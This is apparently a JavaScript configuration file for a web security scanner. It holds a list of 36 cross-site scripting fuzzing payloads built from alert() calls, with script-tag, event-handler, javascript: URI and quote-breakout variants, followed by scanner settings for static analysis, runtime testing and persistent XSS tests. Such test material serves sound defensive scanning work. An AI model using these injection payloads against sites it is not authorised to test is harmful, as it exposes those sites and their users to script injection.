var fuzzer = [
{"id":"oOlOo1","exploitstart":"';alert('","exploitend":"')"},
{"id":"oOlOo2","exploitstart":";alert('","exploitend":"')//"},
{"id":"oOlOo3","exploitstart":";alert('","exploitend":"');//"},
{"id":"oOlOo4","exploitstart":"*/';alert('","exploitend":"'); /*"},
{"id":"oOlOo5","exploitstart":"*/alert('","exploitend":"'); /*"},
{"id":"oOlOo6","exploitstart":"%0A%0D';alert('","exploitend":"');"},
{"id":"oOlOo7","exploitstart":"\" onload=\"alert('","exploitend":"')\"><!--;"},
{"id":"oOlOo8","exploitstart":"\<img src=\"\" onerror=\"alert('","exploitend":"');\"/><!--"},
{"id":"oOlOo9","exploitstart":"<script>alert('","exploitend":"');</script><!--"},
{"id":"oOlOo10","exploitstart":"\"><script>alert('","exploitend":"');</script><!--"},
{"id":"oOlOo11","exploitstart":"\"></textarea><script>alert('","exploitend":"');</script><!--"},
{"id":"oOlOo12","exploitstart":"<img src=\"javascript:alert('","exploitend":"');\">"},
{"id":"oOlOo13","exploitstart":"<<SCRIPT>alert('","exploitend":"');//<</SCRIPT>"},
{"id":"oOlOo14","exploitstart":"\";alert('","exploitend":"');//"},
{"id":"oOlOo15","exploitstart":"\';alert('","exploitend":"');//"},
{"id":"oOlOo16","exploitstart":" BACKGROUND=\"javascript:alert('","exploitend":"')\""},
{"id":"oOlOo17","exploitstart":"<BASE HREF=\"javascript:alert('","exploitend":"');\"//\">"},
{"id":"oOlOo18","exploitstart":"\"\";alert('","exploitend":"')"},
{"id":"oOlOo19","exploitstart":"\";alert('","exploitend":"')//"},
{"id":"oOlOo20","exploitstart":"\";alert('","exploitend":"');//"},
{"id":"oOlOo21","exploitstart":"*/\";alert('","exploitend":"'); /*"},
{"id":"oOlOo22","exploitstart":"*/alert('","exploitend":"'); /*"},
{"id":"oOlOo23","exploitstart":"%0A%0D\";alert('","exploitend":"');"},
{"id":"oOlOo24","exploitstart":" onload=\"alert('","exploitend":"')\"><!--;"},
{"id":"oOlOo25","exploitstart":"<img src=\"\" onerror=\"alert('","exploitend":"');\" /><!--"},
{"id":"oOlOo26","exploitstart":"<script>alert('","exploitend":"');</script><!--"},
{"id":"oOlOo27","exploitstart":"><script>alert('","exploitend":"');</script><!--"},
{"id":"oOlOo28","exploitstart":"></textarea><script>alert('","exploitend":"');</script><!--"},
{"id":"oOlOo29","exploitstart":"<img src=\"javascript:alert('","exploitend":"');\">"},
{"id":"oOlOo30","exploitstart":"<<SCRIPT>alert('","exploitend":"');//<</SCRIPT>"},
{"id":"oOlOo31","exploitstart":"\';alert('","exploitend":"');//"},
{"id":"oOlOo32","exploitstart":"\";alert('","exploitend":"');//"},
{"id":"oOlOo33","exploitstart":" BACKGROUND=\"javascript:alert('","exploitend":"')\""},
{"id":"oOlOo34","exploitstart":"\"javascript:alert('","exploitend":"')\""},
{"id":"oOlOo35","exploitstart":"javascript:alert('","exploitend":"')"},
{"id":"oOlOo36","exploitstart":"<BASE HREF=\"javascript:alert('","exploitend":"');//\">"}
		];
var digitsecsettings = [
{
	"id": "9",
	"title": "Static Code Analysis",
	"type": "boolean",
	"value": "true"
},
{
	"id": "1",
	"title": "Dynamic Runtime Testing",
	"type": "boolean",
	"value": "true"
},{
	"id": "7",
	"title": "Test All Integration End Points",
	"type": "boolean",
	"value": "false"
},{
	"id": "2",
	"title": "Save Malicious Data (required for persistent XSS tests)",
	"type": "boolean",
	"value": "true"
},  {
	"id": "3",
	"title": "Audit Access Control",
	"type": "boolean",
	"value": "true"
}, {
	"id": "4",
	"title": "Nesting depth for static code analysis",
	"type": "integer",
	"value": "10"
}, {
	"id": "5",
	"title": "Email notifications",
	"type": "text",
	"value": ""
}, {
	"id": "6",
	"title": "Max. number of runtime tests",
	"type": "integer",
	"value": "800"
},{
	"id": "8",
	"title": "Custom rules",
	"type": "custom_rule",
	"value": [{
		"id": "Unique_Id",
		"title": "My_Custom_Rules",
		"type": "regex,control_flow,data_flow",
		"rule_set": [{
			"rule": "source"
		}]
	}]
}];		